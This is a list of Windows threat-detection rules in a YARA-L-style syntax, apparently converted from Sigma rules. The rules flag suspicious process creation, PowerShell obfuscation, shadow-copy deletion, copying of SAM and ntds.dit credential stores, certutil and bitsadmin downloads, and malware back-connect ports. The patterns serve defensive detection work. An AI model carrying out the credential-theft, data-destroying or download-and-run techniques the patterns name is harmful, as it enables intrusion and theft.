<li><a href="#">rule suspicious_execution_from_outlook { meta: author = "Markus Neis" description = "Detects EnableUnsafeClientMailRules used for Script Execution from Outlook License: ." reference = "" version = "0.01" created = "2018/12/27" category = "process_creation" product = "windows" mitre = "execution, t1059, t1202" events: (re.regex($clientMailRules.target.process.command_line, `.*EnableUnsafeClientMailRules.*`) or (re.regex($clientMailRules.src.process.file.full_path, `.*\\outlook\.exe`) and re.regex($clientMailRules.target.process.command_line, `.*\\.*\.exe`))) condition: $clientMailRules 
<li><a href="#">rule suspicious_gup_usage { meta: author = "Florian Roth" description = "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks License: ." reference = "" version = "0.01" created = "2019/02/06" category = "process_creation" product = "windows" mitre = "defense_evasion, t1073" events: ((re.regex($selection.target.process.file.full_path, `.*\\GUP\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.file.full_path, `C:\\Users\\.*\\AppData\\Local\\Notepad\+\+\\updater\\gup\.exe`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\.*\\AppData\\Roaming\\Notepad\+\+\\updater\\gup\.exe`) or $selection.target.process.file.full_path = "C:\\Program Files\\Notepad++\\updater\\gup.exe" or $selection.target.process.file.full_path = "C:\\Program Files (x86)\\Notepad++\\updater\\gup.exe"))) condition: $selection 
<li><a href="#">rule suspicious_hwp_sub_processes { meta: author = "Florian Roth" description = "Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation License: ." reference = "" version = "0.01" created = "2019/10/24" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, initial_access, t1059, t1202, t1193, g0032" events: (re.regex($selection.src.process.file.full_path, `.*\\Hwp\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\gbb\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_msiexec_directory { meta: author = "Florian Roth" description = "Detects suspicious msiexec process starts in an uncommon directory License: ." reference = "" version = "0.01" created = "2019/11/14" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: ((re.regex($selection.target.process.file.full_path, `.*\\msiexec\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.file.full_path, `C:\\Windows\\System32\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\SysWOW64\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\WinSxS\\.*`)))) condition: $selection 
<li><a href="#">rule suspicious_parent_of_cscexe { meta: author = "Florian Roth" description = "Detects a suspicious parent of csc.exe, which could by a sign of payload delivery License: ." reference = "" version = "0.01" created = "2019/02/11" product = "windows" service = "sysmon" mitre = "defense_evasion, t1036" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\csc\.exe.*`) and (re.regex($selection.src.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\cscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\mshta\.exe`))) condition: $selection 
<li><a href="#">rule suspicious_powershell_invocation_based_on_parent_process { meta: author = "Florian Roth" description = "Detects suspicious powershell invocations from interpreters or unusual programs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (((re.regex($selection.src.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\cscript\.exe`)) and re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.principal.file.full_path, `.*\\Health Service State\\.*`))) condition: $selection 
<li><a href="#">rule suspicious_powershell_parameter_substring { meta: author = "Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix)" description = "Detects suspicious PowerShell invocation with a parameter substring License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (re.regex($selection.target.process.file.full_path, `.*\\Powershell\.exe`) and ($selection.target.process.command_line = " -windowstyle h " or $selection.target.process.command_line = " -windowstyl h" or $selection.target.process.command_line = " -windowsty h" or $selection.target.process.command_line = " -windowst h" or $selection.target.process.command_line = " -windows h" or $selection.target.process.command_line = " -windo h" or $selection.target.process.command_line = " -wind h" or $selection.target.process.command_line = " -win h" or $selection.target.process.command_line = " -wi h" or $selection.target.process.command_line = " -win h " or $selection.target.process.command_line = " -win hi " or $selection.target.process.command_line = " -win hid " or $selection.target.process.command_line = " -win hidd " or $selection.target.process.command_line = " -win hidde " or $selection.target.process.command_line = " -NoPr " or $selection.target.process.command_line = " -NoPro " or $selection.target.process.command_line = " -NoProf " or $selection.target.process.command_line = " -NoProfi " or $selection.target.process.command_line = " -NoProfil " or $selection.target.process.command_line = " -nonin " or $selection.target.process.command_line = " -nonint " or $selection.target.process.command_line = " -noninte " or $selection.target.process.command_line = " -noninter " or $selection.target.process.command_line = " -nonintera " or $selection.target.process.command_line = " -noninterac " or $selection.target.process.command_line = " -noninteract " or $selection.target.process.command_line = " -noninteracti " or $selection.target.process.command_line = " -noninteractiv " or $selection.target.process.command_line = " -ec " or $selection.target.process.command_line = " -encodedComman " or $selection.target.process.command_line = " -encodedComma " or $selection.target.process.command_line = " -encodedComm " or $selection.target.process.command_line = " -encodedCom " or $selection.target.process.command_line = " -encodedCo " or $selection.target.process.command_line = " -encodedC " or $selection.target.process.command_line = " -encoded " or $selection.target.process.command_line = " -encode " or $selection.target.process.command_line = " -encod " or $selection.target.process.command_line = " -enco " or $selection.target.process.command_line = " -en ") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_process_created_on_unusual_directories { meta: author = "Erdem Kucukmustafa" description = "Detect Suspicious Process on Unusual Directories License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Defense_Evasion, T1036" events: ($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.file.full_path, `C:\\Windows\\Fonts.*`) or re.regex($selection.target.process.file.full_path, `.*\\htdocs.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Media.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\Public.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\system32\\config\\systemprofile.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\addins.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Debug.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\NetworkService.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\Default.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Help.*`) or re.regex($selection.target.process.file.full_path, `C:\\Intel\\Logs.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\repair.*`) or re.regex($selection.target.process.file.full_path, `C:\\PerfLogs.*`) or re.regex($selection.target.process.file.full_path, `C:\\$Recycle\.bin.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\security.*`) or re.regex($selection.target.process.file.full_path, `.*\\wwwroot.*`))) condition: $selection 
<li><a href="#">rule suspicious_process_creation { meta: author = "Florian Roth" description = "Detects suspicious process starts on Windows systems based on keywords License: ." reference = "" version = "0.01" created = "2018/01/01" events: (re.regex($event.target.process.command_line, `vssadmin.exe delete shadows.*`) or re.regex($event.target.process.command_line, `vssadmin delete shadows.*`) or re.regex($event.target.process.command_line, `vssadmin create shadow /for=C:.*`) or re.regex($event.target.process.command_line, `copy \\\\?\\GLOBALROOT\\Device\\\\.*\\windows\\ntds\\ntds.dit.*`) or re.regex($event.target.process.command_line, `copy \\\\?\\GLOBALROOT\\Device\\\\.*\\config\\SAM.*`) or re.regex($event.target.process.command_line, `copy \\\\?\\GLOBALROOT\\Device\\\\.*\\config\\SYSTEM.*`) or re.regex($event.target.process.command_line, `type \\\\?\\GLOBALROOT\\Device\\\\.*\\config\\SAM.*`) or re.regex($event.target.process.command_line, `type \\\\?\\GLOBALROOT\\Device\\\\.*\\config\\SYSTEM.*`) or re.regex($event.target.process.command_line, `type \\\\?\\GLOBALROOT\\Device\\\\.*\\windows\\ntds\\ntds.dit.*`) or re.regex($event.target.process.command_line, `reg SAVE HKLM\\SYSTEM .*`) or re.regex($event.target.process.command_line, `reg SAVE HKLM\\SAM .*`) or re.regex($event.target.process.command_line, `.* sekurlsa:.*`) or re.regex($event.target.process.command_line, `net localgroup administrators .* /add`) or re.regex($event.target.process.command_line, `net group "Domain Admins" .* /ADD /DOMAIN`) or re.regex($event.target.process.command_line, `certutil.exe .*-urlcache.* http.*`) or re.regex($event.target.process.command_line, `certutil.exe .*-urlcache.* ftp.*`) or re.regex($event.target.process.command_line, `netsh advfirewall firewall .*\\AppData\\\\.*`) or re.regex($event.target.process.command_line, `attrib +S +H +R .*\\AppData\\\\.*`) or re.regex($event.target.process.command_line, `schtasks.* /create .*\\AppData\\\\.*`) or re.regex($event.target.process.command_line, `schtasks.* /sc minute.*`) or re.regex($event.target.process.command_line, `.*\\Regasm.exe .*\\AppData\\\\.*`) or re.regex($event.target.process.command_line, `.*\\Regasm .*\\AppData\\\\.*`) or re.regex($event.target.process.command_line, `.*\\bitsadmin.* /transfer.*`) or re.regex($event.target.process.command_line, `.*\\certutil.exe .* -decode .*`) or re.regex($event.target.process.command_line, `.*\\certutil.exe .* -decodehex .*`) or re.regex($event.target.process.command_line, `.*\\certutil.exe -ping .*`) or re.regex($event.target.process.command_line, `icacls .* /grant Everyone:F /T /C /Q`) or re.regex($event.target.process.command_line, `.* wmic shadowcopy delete .*`) or re.regex($event.target.process.command_line, `.* wmic shadowcopy call create Volume=.*`) or re.regex($event.target.process.command_line, `.* wbadmin.exe delete catalog -quiet.*`) or re.regex($event.target.process.command_line, `.*\\wscript.exe .*.jse`) or re.regex($event.target.process.command_line, `.*\\wscript.exe .*.js`) or re.regex($event.target.process.command_line, `.*\\wscript.exe .*.vba`) or re.regex($event.target.process.command_line, `.*\\wscript.exe .*.vbe`) or re.regex($event.target.process.command_line, `.*\\cscript.exe .*.jse`) or re.regex($event.target.process.command_line, `.*\\cscript.exe .*.js`) or re.regex($event.target.process.command_line, `.*\\cscript.exe .*.vba`) or re.regex($event.target.process.command_line, `.*\\cscript.exe .*.vbe`) or re.regex($event.target.process.command_line, `.*\\fodhelper.exe`) or re.regex($event.target.process.command_line, `.*waitfor.*/s.*`) or re.regex($event.target.process.command_line, `.*waitfor.*/si persist.*`) or re.regex($event.target.process.command_line, `.*remote.*/s.*`) or re.regex($event.target.process.command_line, `.*remote.*/c.*`) or re.regex($event.target.process.command_line, `.*remote.*/q.*`) or re.regex($event.target.process.command_line, `.*AddInProcess.*`) or re.regex($event.target.process.command_line, `.* /stext .*`) or re.regex($event.target.process.command_line, `.* /scomma .*`) or re.regex($event.target.process.command_line, `.* /stab .*`) or re.regex($event.target.process.command_line, `.* /stabular .*`) or re.regex($event.target.process.command_line, `.* /shtml .*`) or re.regex($event.target.process.command_line, `.* /sverhtml .*`) or re.regex($event.target.process.command_line, `.* /sxml .*`)) ($event.metadata.product_log_id = "4688" or $event.metadata.product_log_id = "1") condition: $event 
<li><a href="#">rule suspicious_process_start_locations { meta: author = "juju4" description = "Detects suspicious process run from unusual locations License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036, car.2013-05-002" events: ((re.regex($selection.target.process.file.full_path, `.*:\\RECYCLER\\.*`) or re.regex($selection.target.process.file.full_path, `.*:\\SystemVolumeInformation\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\Tasks\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\debug\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\fonts\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\help\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\drivers\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\addins\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\cursors\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\\\Windows\\\\system32\\tasks\\.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_program_location_process_starts { meta: author = "Florian Roth" description = "Detects programs running in suspicious files system locations License: ." reference = "" version = "0.01" created = "2019/01/15" category = "process_creation" product = "windows" events: ((re.regex($selection.target.process.file.full_path, `.*\\$Recycle\.bin`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\Public\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Perflogs\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\Fonts\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\IME\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\addins\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\debug\\.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_program_location_with_network_connections { meta: author = "Florian Roth" description = "Detects programs with network connections running in suspicious files system locations License: ." reference = "" version = "0.01" created = "2017/03/19" product = "windows" service = "sysmon" events: ($selection.metadata.product_event_type = "3" and (re.regex($selection.target.process.file.full_path, `.*\\$Recycle\.bin`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\All Users\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\Default\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\Public\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Perflogs\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\config\\systemprofile\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\Fonts\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\IME\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\addins\\.*`))) condition: $selection 
<li><a href="#">rule suspicious_psexec_execution { meta: author = "Samir Bousseaden" description = "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "lateral_movement, t1077" events: (($selection1.metadata.product_event_type = "5145" and re.regex($selection1.target.resource.name, `.*\\IPC$`) and (re.regex($selection1.target.file.full_path, `.*-stdin`) or re.regex($selection1.target.file.full_path, `.*-stdout`) or re.regex($selection1.target.file.full_path, `.*-stderr`))) and not ($selection1.metadata.product_event_type = "5145" and re.regex($selection1.target.resource.name, `.*\\IPC$`) and re.regex($selection1.target.file.full_path, `PSEXESVC.*`))) condition: $selection1 
<li><a href="#">rule suspicious_rasdial_activity { meta: author = "juju4" description = "Detects suspicious process related to rasdial.exe License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" events: ($selection.target.process.command_line = "rasdial" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_rdp_redirect_using_tscon { meta: author = "Florian Roth" description = "Detects a suspicious RDP session redirect using tscon.exe License: ." reference = "" version = "0.01" created = "2018/03/17" category = "process_creation" product = "windows" events: (re.regex($selection.target.process.command_line, `.* /dest:rdp-tcp:.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_reconnaissance_activity { meta: author = "Florian Roth" description = "Detects suspicious command line activity on Windows systems License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" events: (($selection.target.process.command_line = "net group \"domain admins\" /domain" or $selection.target.process.command_line = "net localgroup administrators") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_reconnaissance_activity_sysmon { meta: author = "Florian Roth, Alexandr Yampolskyi" description = "Detects suspicious command line activity on Windows systems. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1059" events: ($selection.metadata.product_event_type = "1" and ($selection.target.process.command_line = "net group \"domain admins\" /domain" or $selection.target.process.command_line = "net localgroup administrators")) condition: $selection 
<li><a href="#">rule suspicious_run_key_from_download { meta: author = "Florian Roth" description = "Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories License: ." reference = "" version = "0.01" created = "2019/10/01" product = "windows" service = "sysmon" mitre = "persistence, t1060" events: ($selection.metadata.product_event_type = "13" and (re.regex($selection.target.process.file.full_path, `.*\\Downloads\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Temporary Internet Files\\Content\.Outlook\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Local Settings\\Temporary Internet Files\\.*`)) and re.regex($selection.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.*`)) condition: $selection 
<li><a href="#">rule suspicious_rundll32_activity { meta: author = "juju4" description = "Detects suspicious process related to rundll32 based on arguments License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, execution, t1085" events: ((re.regex($selection.target.process.command_line, `.*\\rundll32\.exe.* url\.dll,.*OpenURL .*`) or re.regex($selection.target.process.command_line, `.*\\rundll32\.exe.* url\.dll,.*OpenURLA .*`) or re.regex($selection.target.process.command_line, `.*\\rundll32\.exe.* url\.dll,.*FileProtocolHandler .*`) or re.regex($selection.target.process.command_line, `.*\\rundll32\.exe.* zipfldr\.dll,.*RouteTheCall .*`) or re.regex($selection.target.process.command_line, `.*\\rundll32\.exe.* Shell32\.dll,.*Control_RunDLL .*`) or re.regex($selection.target.process.command_line, `.*\\rundll32\.exe javascript:.*`) or re.regex($selection.target.process.command_line, `.* url\.dll,.*OpenURL .*`) or re.regex($selection.target.process.command_line, `.* url\.dll,.*OpenURLA .*`) or re.regex($selection.target.process.command_line, `.* url\.dll,.*FileProtocolHandler .*`) or re.regex($selection.target.process.command_line, `.* zipfldr\.dll,.*RouteTheCall .*`) or re.regex($selection.target.process.command_line, `.* Shell32\.dll,.*Control_RunDLL .*`) or re.regex($selection.target.process.command_line, `.* javascript:.*`) or re.regex($selection.target.process.command_line, `.*\.RegisterXLL.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_scheduled_task { meta: author = "Emir Erdogan" description = "Detection of suspicious scheduled tasks License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1053, T1168" events: (re.regex($selection.target.process.command_line, `.*schtasks\.exe /create /sc MINUTE /tn SystemSoundsServices /tr \"regsvr32\.exe\".*`) or re.regex($selection.target.process.command_line, `.*/s /n /u /i:http:.*`)) condition: $selection 
<li><a href="#">rule suspicious_schtasks_creation_possible_windows_0day_lpe_aka_polarbear_by_sandboxescaper { meta: author = "Roman Ranskyi" description = "Possible task scheduler .job import arbitrary DACL write. License: ." reference = "" version = "0.01" created = "2019/05/22" product = "windows" service = "process_creation" mitre = "Execution, Privilege Escalation, t1053" events: (($selection.metadata.product_event_type = "1" or $selection.metadata.product_event_type = "4688") and $selection.target.process.command_line = "schtasks" and $selection.target.process.command_line = "/change" and $selection.target.process.command_line = "/TN" and $selection.target.process.command_line = "/RU" and $selection.target.process.command_line = "/RP") condition: $selection 
<li><a href="#">rule suspicious_svchost_process_sysmon { meta: author = "Florian Roth, Alexandr Yampolskyi" description = "Detects a suspicious svchost process start. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1059" events: (($selection.metadata.product_event_type = "1" and $selection.target.process.file.full_path = "svchost.exe") and not ($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.command_line, `.*\\services\.exe`) or re.regex($selection.target.process.command_line, `.*\\MsMpEng\.exe`)))) condition: $selection 
<li><a href="#">rule suspicious_sysvol_domain_group_policy_access { meta: author = "Markus Neis" description = "Detects Access to Domain Group Policies stored in SYSVOL License: ." reference = "" version = "0.01" created = "2018/04/09" category = "process_creation" product = "windows" mitre = "credential_access, t1003" events: (re.regex($selection.target.process.command_line, `.*\\SYSVOL\\.*\\policies\\.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_typical_malware_back_connect_ports { meta: author = "Florian Roth" description = "Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases License: ." reference = "" version = "0.01" created = "2017/03/19" product = "windows" service = "sysmon" mitre = "command_and_control, t1043" events: (($selection.metadata.product_event_type = "3" and ($selection.target.port = "4443" or $selection.target.port = "2448" or $selection.target.port = "8143" or $selection.target.port = "1777" or $selection.target.port = "1443" or $selection.target.port = "243" or $selection.target.port = "65535" or $selection.target.port = "13506" or $selection.target.port = "3360" or $selection.target.port = "200" or $selection.target.port = "198" or $selection.target.port = "49180" or $selection.target.port = "13507" or $selection.target.port = "6625" or $selection.target.port = "4444" or $selection.target.port = "4438" or $selection.target.port = "1904" or $selection.target.port = "13505" or $selection.target.port = "13504" or $selection.target.port = "12102" or $selection.target.port = "9631" or $selection.target.port = "5445" or $selection.target.port = "2443" or $selection.target.port = "777" or $selection.target.port = "13394" or $selection.target.port = "13145" or $selection.target.port = "12103" or $selection.target.port = "5552" or $selection.target.port = "3939" or $selection.target.port = "3675" or $selection.target.port = "666" or $selection.target.port = "473" or $selection.target.port = "5649" or $selection.target.port = "4455" or $selection.target.port = "4433" or $selection.target.port = "1817" or $selection.target.port = "100" or $selection.target.port = "65520" or $selection.target.port = "1960" or $selection.target.port = "1515" or $selection.target.port = "743" or $selection.target.port = "700" or $selection.target.port = "14154" or $selection.target.port = "14103" or $selection.target.port = "14102" or $selection.target.port = "12322" or $selection.target.port = "10101" or $selection.target.port = "7210" or $selection.target.port = "4040" or $selection.target.port = "9943")) and not ((re.regex($selection.target.process.file.full_path, `.*\\Program Files.*`) or ((re.regex($selection.target.ip, `10\..*`) or re.regex($selection.target.ip, `192\.168\..*`) or re.regex($selection.target.ip, `172\.16\..*`) or re.regex($selection.target.ip, `172\.17\..*`) or re.regex($selection.target.ip, `172\.18\..*`) or re.regex($selection.target.ip, `172\.19\..*`) or re.regex($selection.target.ip, `172\.20\..*`) or re.regex($selection.target.ip, `172\.21\..*`) or re.regex($selection.target.ip, `172\.22\..*`) or re.regex($selection.target.ip, `172\.23\..*`) or re.regex($selection.target.ip, `172\.24\..*`) or re.regex($selection.target.ip, `172\.25\..*`) or re.regex($selection.target.ip, `172\.26\..*`) or re.regex($selection.target.ip, `172\.27\..*`) or re.regex($selection.target.ip, `172\.28\..*`) or re.regex($selection.target.ip, `172\.29\..*`) or re.regex($selection.target.ip, `172\.30\..*`) or re.regex($selection.target.ip, `172\.31\..*`) or re.regex($selection.target.ip, `127\..*`)) and $selection.target.ip = "false")))) condition: $selection 
<li><a href="#">rule suspicious_user_agent { meta: author = "Florian Roth" description = "Detects suspicious malformed user agent strings in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: (($selection.src.application = "user-agent" or re.regex($selection.src.application, `.* \(compatible;MSIE .*`) or re.regex($selection.src.application, `.*\.0;Windows NT .*`) or re.regex($selection.src.application, `Mozilla/3\.0 .*`) or re.regex($selection.src.application, `Mozilla/2\.0 .*`) or re.regex($selection.src.application, `Mozilla/1\.0 .*`) or re.regex($selection.src.application, `Mozilla .*`) or re.regex($selection.src.application, ` Mozilla/.*`) or re.regex($selection.src.application, `Mozila/.*`) or $selection.src.application = "_" or $selection.src.application = "CertUtil URL Agent" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0)" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0") and not (re.regex($selection.src.application, `Mozilla/3\.0 .* Acrobat .*`))) condition: $selection 
<li><a href="#">rule suspicious_wmi_execution { meta: author = "Michael Haag, Florian Roth" description = "Detects WMI executing suspicious commands License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1047" events: (re.regex($selection.target.process.file.full_path, `.*\\wmic\.exe`) and (re.regex($selection.target.process.command_line, `.*/NODE:.*process call create .*`) or re.regex($selection.target.process.command_line, `.* path AntiVirusProduct get .*`) or re.regex($selection.target.process.command_line, `.* path FirewallProduct get .*`) or re.regex($selection.target.process.command_line, `.* shadowcopy delete .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule suspicious_xor_encoded_powershell_command_line { meta: author = "Sami Ruohonen" description = "Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands. License: ." reference = "" version = "0.01" created = "2018/09/05" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (re.regex($selection.target.process.command_line, `.* -bxor.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule swisyn_malware_detector_sysmon_behavior_august_2019 { meta: author = "Lee Archinal" description = "This content detects charactaristics of the Syisyn malware strain License: ." reference = "" version = "0.01" created = "2019/08/15" product = "windows" service = "sysmon" mitre = "defense_evasion, t1112" events: ((($selection1.metadata.product_event_type = "13" and $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\WINMSS" and ($selection1.metadata.description = "Type" or $selection1.metadata.description = "Start" or $selection1.metadata.description = "ErrorControl" or $selection1.metadata.description = "ImagePath" or $selection1.metadata.description = "DisplayName" or $selection1.metadata.description = "WOW64" or $selection1.metadata.description = "ObjectName" or $selection1.metadata.description = "Description")) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\SfcApi`) or $selection1.target.file.full_path = "C:\\inf\\oem13.PNF" or $selection1.target.file.full_path = "C:\\inf\\oem13.inf" or $selection1.target.file.full_path = "C:\\LastGood\\system32\\DRIVERS\\winyyy.sys (copy)" or $selection1.target.file.full_path = "C:\\Temp\\OLD5.tmp" or $selection1.target.file.full_path = "C:\\inf\\INFCACHE.0" or $selection1.target.file.full_path = "C:\\inf\\INFCACHE.1 (copy)" or $selection1.target.file.full_path = "C:\\stin.bat" or $selection1.target.file.full_path = "C:\\Windows\\System32\\DRIVERS\\winyyy.sys (copy)" or $selection1.target.file.full_path = "C:\\Windows\\System32\\drivers\\SET3.tmp" or $selection1.target.file.full_path = "C:\\Windows\\System32\\drivers\\SET6.tmp" or $selection1.target.file.full_path = "C:\\winsys.exe" or $selection1.target.file.full_path = "C:\\winsys.inf" or $selection1.target.file.full_path = "C:\\winyyy.sys" or $selection1.target.file.full_path = "C:\\SMSS.bat" or $selection1.target.file.full_path = "C:\\lsass.exe" or $selection1.target.file.full_path = "C:\\winhost.exe" or $selection1.target.file.full_path = "C:\\SysWOW64\\SMSS.bat" or $selection1.target.file.full_path = "C:\\SysWOW64\\lsasys.exe" or $selection1.target.file.full_path = "C:\\SysWOW64\\winhost.exe" or $selection1.target.file.full_path = "C:\\Windows\\System32\\SMSS.bat" or $selection1.target.file.full_path = "C:\\Windows\\System32\\lsasys.exe" or $selection1.target.file.full_path = "C:\\Windows\\System32\\winhost.exe"))) or ($selection1.metadata.product_event_type = "1" and ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\winhost.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\System32\\lsasys.exe" or $selection1.target.process.file.full_path = "C:\\SysWOW64\\winhost.exe" or $selection1.target.process.file.full_path = "C:\\SysWOW64\\lsasys.exe" or $selection1.target.process.file.full_path = "C:\\lsass.exe" or $selection1.target.process.file.full_path = "C:\\winsys.exe"))) condition: $selection1 
<li><a href="#">rule sysmon_service_enumeration { meta: author = "Osman Demir" description = "Detects Sysmon Enumeration Activity License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "powershell" mitre = "discovery, t1063" events: (re.regex($selection.target.process.command_line, `ls HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels | Where-Object \\{$_\.name -like \".*sysmon.*\"\\}`) or $selection.target.process.command_line = "ls HKCU:\\Software\\Sysinternals | Select-Object name" or $selection.target.process.command_line = "Get-CimInstance win32_service -Filter \"Description = 'System Monitor service'\"") condition: $selection 
<li><a href="#">rule sysmon_state_and_configuration_changed { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Detects sysmon state and configuration change. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1089" events: ($selection1.metadata.product_event_type = "4" or $selection1.metadata.product_event_type = "16") condition: $selection1 
